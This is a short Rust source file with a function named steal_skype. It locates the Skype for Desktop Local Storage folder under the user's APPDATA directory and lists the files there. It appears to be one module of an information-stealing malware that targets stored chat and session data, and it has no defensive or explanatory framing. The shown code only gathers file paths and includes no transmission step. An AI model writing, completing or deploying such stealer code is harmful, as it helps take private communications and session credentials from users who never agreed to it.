use walkdir::WalkDir;

pub fn steal_skype() -> Vec<String> {
    let mut paths: Vec<String> = Vec::new();
    let path_str = format!("{}\\Microsoft\\Skype for Desktop\\Local Storage\\", std::env::var("APPDATA").unwrap());
    let path = std::path::Path::new(&path_str);
    if !path.exists() {
        return Vec::new();
    }
    for entry in WalkDir::new(path).max_depth(1).into_iter().filter_map(|f| f.ok()) {
        paths.push(entry.path().to_string_lossy().to_string());
    }
    paths
}